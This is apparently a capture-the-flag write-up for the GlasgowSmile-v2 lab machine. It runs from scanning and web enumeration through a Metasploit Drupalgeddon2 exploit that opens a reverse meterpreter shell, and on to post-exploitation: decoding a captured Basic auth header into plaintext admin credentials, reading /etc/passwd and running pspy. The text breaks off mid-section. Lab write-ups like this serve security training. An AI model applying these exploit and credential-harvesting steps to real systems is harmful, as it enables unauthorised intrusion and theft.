# GlasgowSmile-v2 Writeup
Let's start with a network scan
```bash
 Currently scanning: 192.168.0.105/24   |   Screen View: Unique Hosts                                                                                                                                         
                                                                                                                                                                                                              
 2 Captured ARP Req/Rep packets, from 2 hosts.   Total size: 120                                                                                                                                              
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 192.168.0.103   40:65:d4:5e:e0:3e      1      60  Unknown vendor                                                                                                                                             
 192.168.0.129   00:0c:29:a2:5a:01      1      60  VMware, Inc.
```
\
Next, Open Ports
```bash
PORT   STATE SERVICE    REASON
22/tcp   open     ssh        OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp   open     http       Apache httpd 2.4.38 ((Debian))
83/tcp   open     http       Apache httpd 2.4.38 ((Debian))
```
\
I opened both port 80 and 83 , and they were the same page
\
<img width="1443" height="753" alt="image" src="https://github.com/user-attachments/assets/109d7bb0-583b-4007-ac15-b5e618732892" />
\
Then i do some enumeration on both port 80 and 83 , both gave same results
```bash
dirsearch -u http://192.168.0.129:83/
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3                                                                                                                                                                                   
 (_||| _) (/_(_|| (_| )                                                                                                                                                                                            
                                                                                                                                                                                                                   
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/reports/http_192.168.0.129_83/__26-02-02_10-27-18.txt

Target: http://192.168.0.129:83/

[10:27:18] Starting:                                                                                                                                                                                               
[10:27:19] 403 -  278B  - /.ht_wsr.txt                                      
[10:27:19] 403 -  278B  - /.htaccess.bak1                                   
[10:27:19] 403 -  278B  - /.htaccess.sample                                 
[10:27:19] 403 -  278B  - /.htaccess.save
[10:27:19] 403 -  278B  - /.htaccess.orig
[10:27:19] 403 -  278B  - /.htaccess_extra                                  
[10:27:19] 403 -  278B  - /.htaccess_sc
[10:27:19] 403 -  278B  - /.htaccessOLD
[10:27:19] 403 -  278B  - /.htaccessBAK
[10:27:19] 403 -  278B  - /.htaccess_orig
[10:27:19] 403 -  278B  - /.htaccessOLD2                                    
[10:27:19] 403 -  278B  - /.htm                                             
[10:27:19] 403 -  278B  - /.html
[10:27:19] 403 -  278B  - /.htpasswd_test                                   
[10:27:19] 403 -  278B  - /.htpasswds
[10:27:19] 403 -  278B  - /.httr-oauth
[10:27:19] 403 -  278B  - /.php                                             
[10:27:35] 301 -  322B  - /javascript  ->  http://192.168.0.129:83/javascript/
[10:27:44] 403 -  278B  - /server-status                                    
[10:27:44] 403 -  278B  - /server-status/
[10:27:48] 200 -  286B  - /todo.txt                                         
                                                                             
Task Completed
```
We found a file todo.txt
\
<img width="1105" height="609" alt="image" src="https://github.com/user-attachments/assets/cced9ea7-fbe8-46ec-a263-97bbcbefd815" />
\
From the text file , we know that , there is a bash file , so we start enumerating with .sh extension 
```bash
gobuster dir -t 100 -u http://192.168.0.129:83/  -w /usr/share/wordlists/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x txt,sh -r 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.0.129:83/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              txt,sh
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/javascript           (Status: 403) [Size: 278]
/todo.txt             (Status: 200) [Size: 456]
/joke.sh              (Status: 200) [Size: 1676]
```
\
<img width="1142" height="717" alt="image" src="https://github.com/user-attachments/assets/b33e36e7-7be4-4007-9fcc-d3b1f7df46e6" />
\
From the script , we see that there is another directory "/Glasgow---Smile2/"
\
<img width="1671" height="723" alt="image" src="https://github.com/user-attachments/assets/6a3e15de-2de9-4959-b861-472ffffe451f" />
\
And if we check wappalyzer , it says that this is drupal cms 
\
<img width="504" height="550" alt="image" src="https://github.com/user-attachments/assets/62f0aa6b-ca08-480c-af46-79ec1d60e19e" />
\
Next , we use metasploit to get a reverse shell
```bash
msfconsole
Metasploit tip: Use the edit command to open the currently active module 
in your editor
                                                  
 _                                                    _
/ \    /\         __                         _   __  /_/ __
| |\  / | _____   \ \           ___   _____ | | /  \ _   \ \
| | \/| | | ___\ |- -|   /\    / __\ | -__/ | || | || | |- -|
|_|   | | | _|__  | |_  / -\ __\ \   | |    | | \__/| |  | |_
      |/  |____/  \___\/ /\ \\___/   \/     \__|    |_\  \___\


       =[ metasploit v6.4.84-dev                                ]
+ -- --=[ 2,547 exploits - 1,309 auxiliary - 1,683 payloads     ]
+ -- --=[ 432 post - 49 encoders - 13 nops - 9 evasion          ]

Metasploit Documentation: https://docs.metasploit.com/
The Metasploit Framework is a Rapid7 Open Source Project

msf > search drupal 8

Matching Modules
================

   #   Name                                           Disclosure Date  Rank       Check  Description
   -   ----                                           ---------------  ----       -----  -----------
   0   exploit/unix/webapp/drupal_drupalgeddon2       2018-03-28       excellent  Yes    Drupal Drupalgeddon 2 Forms API Property Injection
   1     \_ target: Automatic (PHP In-Memory)         .                .          .      .
   2     \_ target: Automatic (PHP Dropper)           .                .          .      .
   3     \_ target: Automatic (Unix In-Memory)        .                .          .      .
   4     \_ target: Automatic (Linux Dropper)         .                .          .      .
   5     \_ target: Drupal 7.x (PHP In-Memory)        .                .          .      .
   6     \_ target: Drupal 7.x (PHP Dropper)          .                .          .      .
   7     \_ target: Drupal 7.x (Unix In-Memory)       .                .          .      .
   8     \_ target: Drupal 7.x (Linux Dropper)        .                .          .      .
   9     \_ target: Drupal 8.x (PHP In-Memory)        .                .          .      .
   10    \_ target: Drupal 8.x (PHP Dropper)          .                .          .      .
   11    \_ target: Drupal 8.x (Unix In-Memory)       .                .          .      .
   12    \_ target: Drupal 8.x (Linux Dropper)        .                .          .      .
   13    \_ AKA: SA-CORE-2018-002                     .                .          .      .
   14    \_ AKA: Drupalgeddon 2                       .                .          .      .
   15  auxiliary/gather/drupal_openid_xxe             2012-10-17       normal     Yes    Drupal OpenID External Entity Injection
   16  exploit/unix/webapp/drupal_restws_unserialize  2019-02-20       normal     Yes    Drupal RESTful Web Services unserialize() RCE
   17    \_ target: PHP In-Memory                     .                .          .      .
   18    \_ target: Unix In-Memory                    .                .          .      .
   19  auxiliary/scanner/http/drupal_views_user_enum  2010-07-02       normal     Yes    Drupal Views Module Users Enumeration
   20  exploit/unix/webapp/php_xmlrpc_eval            2005-06-29       excellent  Yes    PHP XML-RPC Arbitrary Code Execution


Interact with a module by name or index. For example info 20, use 20 or use exploit/unix/webapp/php_xmlrpc_eval

msf > use 0
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
msf exploit(unix/webapp/drupal_drupalgeddon2) > options

Module options (exploit/unix/webapp/drupal_drupalgeddon2):

   Name         Current Setting     Required  Description
   ----         ---------------     --------  -----------
   DUMP_OUTPUT  false               no        Dump payload command output
   PHP_FUNC     passthru            yes       PHP function to execute
   Proxies                          no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: sapni, socks4, socks5, http, socks5h
   RHOSTS       192.168.0.129       yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT        80                  yes       The target port (TCP)
   SSL          false               no        Negotiate SSL/TLS for outgoing connections
   TARGETURI    /Glasgow---Smile2/  yes       Path to Drupal install
   VHOST                            no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.0.105    yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic (PHP In-Memory)



View the full module info with the info, or info -d command.

msf exploit(unix/webapp/drupal_drupalgeddon2) > check
[+] 192.168.0.129:80 - The target is vulnerable.
msf exploit(unix/webapp/drupal_drupalgeddon2) > run
[*] Started reverse TCP handler on 192.168.0.105:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable.
[*] Sending stage (40004 bytes) to 192.168.0.129
[*] Meterpreter session 1 opened (192.168.0.105:4444 -> 192.168.0.129:37054) at 2026-02-03 05:50:20 -0500
shell

meterpreter > shell
Process 1856 created.
Channel 0 created.
id   
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
\
Now , after checking a little bit , i found a pcap file , and we remember that a network packet file was mentioned in the bash script
```bash
www-data@glasgowsmile2:/var/www/html$ ls -la
total 88
drwxr-xr-x 3 root     root      4096 Jul 17  2020 .
drwxr-xr-x 5 root     root      4096 Jul  9  2020 ..
drwxrwxrwx 8 www-data www-data  4096 Jun 18  2020 Glasgow---Smile2
-rw-r--r-- 1 bane     bane     59069 Jul 17  2020 glasgow.png
-rw-r--r-- 1 root     root       339 Jul  9  2020 index.html
-rw-r--r-- 1 root     root      1676 Jul 15  2020 joke.sh
-rw-r--r-- 1 bane     bane      1506 Jul 15  2020 smileyface.pcap
-rw-r--r-- 1 root     root       456 Jul  9  2020 todo.txt
```
\
After shifting it to my attacker machine and opening with wireshark
```bash
wget 'http://192.168.0.129:9000/smileyface.pcap'
--2026-02-03 05:57:22--  http://192.168.0.129:9000/smileyface.pcap
Connecting to 192.168.0.129:9000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1506 (1.5K) [application/vnd.tcpdump.pcap]
Saving to: ‘smileyface.pcap’

smileyface.pcap                                     100%[==================================================================================================================>]   1.47K  --.-KB/s    in 0s      

2026-02-03 05:57:22 (144 MB/s) - ‘smileyface.pcap’ saved [1506/1506]

                                                                                                                                                                                                               
C:\home\kali\cysec\vulnhub\Glasgow_Smile\2> wireshark smileyface.pcap
```
\
<img width="1688" height="373" alt="image" src="https://github.com/user-attachments/assets/674943e9-eaf8-4525-9db9-e46eaf38ef14" />
\
We see a limited number of packets , so i follow the TCP stream 
\
<img width="825" height="441" alt="image" src="https://github.com/user-attachments/assets/1314006e-4243-4e79-b887-1a91dab314ff" />
\
Here we can see a line with basic auth header 
```bash
Authorization: Basic YWRtaW46Y1B5R0RnVkpOZk5MMkxLNHB4NW4=
```
\
And from the script once again , we know that this is the command to access files
```bash
curl -u user:password http://localhost/Glasgow---Smile2/
```
\
So decoding the auth header , WE get admin credentials
```bash
echo "YWRtaW46Y1B5R0RnVkpOZk5MMkxLNHB4NW4=" | base64 -d
admin:cPyGDgVJNfNL2LK4px5n
```
\
When i check users on the machine
```bash
cat /etc/passwd | grep sh
root:x:0:0:root:/root:/bin/bash
www-data:x:33:33:www-data:/var/www:/usr/bin/lshell
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
bane:x:1000:1000:bane,,,:/home/bane:/bin/bash
carnage:x:1001:1001:carnage,,,:/home/carnage:/bin/bash
venom:x:1002:1002:venom,,,:/home/venom:/bin/bash
riddler:x:1003:1003:Riddler,,,:/home/riddler:/bin/bash
```
\
After some time , i didnt know how to escalate privileges , so i ran pspy and i found a unique process being run by user wit uid 1002
\
<img width="758" height="22" alt="image" src="https://github.com/user-attachments/assets/89724dfa-eeab-4585-9f3a-b6ed5e12cde8" />
\
```bash
